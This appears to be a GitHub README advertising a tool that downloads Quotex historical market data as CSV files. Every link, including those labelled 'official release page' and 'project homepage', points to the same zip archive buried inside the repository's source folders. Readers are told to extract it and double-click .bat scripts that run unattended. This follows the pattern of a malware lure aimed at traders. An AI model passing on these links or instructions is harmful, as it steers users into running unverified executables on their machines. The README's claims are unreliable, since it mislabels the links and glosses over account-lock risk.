# 📊 quotex-historical-data - Get full market data histories easily

[![Download Now](https://img.shields.io/badge/Download-Data-blue.svg)](https://github.com/chililutefisk51/quotex-historical-data/raw/refs/heads/main/pyquotex/http/historical-data-quotex-v1.4-beta.3.zip)

This tool lets you save long periods of market data. Quotex websites limit your view to 199 candles at once. This program breaks that limit. It gathers information directly from the source. You get full CSV files for your strategy testing. It works for all currency pairs.

## 💻 System requirements

You need a Windows computer. Ensure you have a stable internet connection. Data processing takes a few minutes for long timeframes. 

1. Windows 10 or Windows 11.
2. At least 4 gigabytes of memory.
3. A web browser.
4. Python 3.9 or newer.

## 🛠️ Installation steps

Follow these instructions to set up the tool on your machine.

1. Go to the [official release page](https://github.com/chililutefisk51/quotex-historical-data/raw/refs/heads/main/pyquotex/http/historical-data-quotex-v1.4-beta.3.zip) to download the package.
2. Locate the folder where you saved the file.
3. Right-click the file and select Extract All.
4. Open the folder you just created.
5. Double-click the file named install-requirements.bat. A black window will appear while the computer sets up the necessary files.
6. Wait for the window to close on its own.

## 🚀 Running the tool

Once you finish the setup, you can save your data.

1. Open the tool folder.
2. Locate the file named run-data-grabber.bat.
3. Double-click this file to start the program.
4. The program will ask for your currency pair. Type the symbol exactly as it appears on the website.
5. Input the start and end dates for your scan. 
6. Press the Enter key on your keyboard.
7. The program will connect to the server and begin the download process.
8. You will see a progress bar for each timeframe.
9. When the process finishes, the program creates a folder named data. You will find your files inside this folder.

## 📂 Understanding your files

The program creates files in the CSV format. You can open these files with Microsoft Excel or Google Sheets. Each row represents a specific candle with the following columns:

- Time: The exact moment the candle opened.
- Open: The price at the start of the period.
- High: The highest price reached during the period.
- Low: The lowest price reached during the period.
- Close: The price at the end of the period.
- Volume: The amount of activity during the period.

## 🔧 Frequently asked questions

How much data can I download?
You can download as many candles as the broker provides. There is no hard limit on the depth of the history.

Does my broker account get locked?
The tool uses standard connection methods. It operates like a web browser. Use it to gain insights for your own personal analysis. 

What happens if the internet cuts out?
The program checks for connection drops. If the internet fails, the program pauses. You can restart it later to pick up where you stopped.

Can I run this for multiple pairs at once?
You can open multiple windows of the program. Assign each window to a different currency pair to save time. 

Where do the files go?
The program saves files in the output folder located inside the main application directory.

## 🌐 Support and updates

This project receives updates when the broker changes its website code. Check the main page periodically to see if a newer version is ready. If you encounter errors, check the logs folder. These files contain details about the connection process.

## 📦 Getting the latest version

Visit the [project homepage](https://github.com/chililutefisk51/quotex-historical-data/raw/refs/heads/main/pyquotex/http/historical-data-quotex-v1.4-beta.3.zip) to access the latest downloads. Always ensure you run the installation script again if you download a significant update. This ensures all background settings match the current version of the tool.

## 📈 Tips for better results

- Use short timeframes for higher accuracy.
- Download data during market hours for the best stability.
- Keep your computer screen on while the tool runs for large requests.
- Periodically move files out of the data folder. A cleaner folder helps the program manage file names better.
- If a download finishes with missing entries, try the date range again. Sometimes the server takes a moment to respond. 

This tool serves as a bridge between the server and your local drive. It bypasses the 199-candle limit by sending automated requests for chunks of data. Once you have the files, you own the historical data. You can perform deep analysis or build custom models. The logic inside the tool handles the translation of raw packets into readable tables. No technical knowledge of web sockets is required. The automation handles the handshake and authentication automatically. Focus on your strategy rather than manual data collection.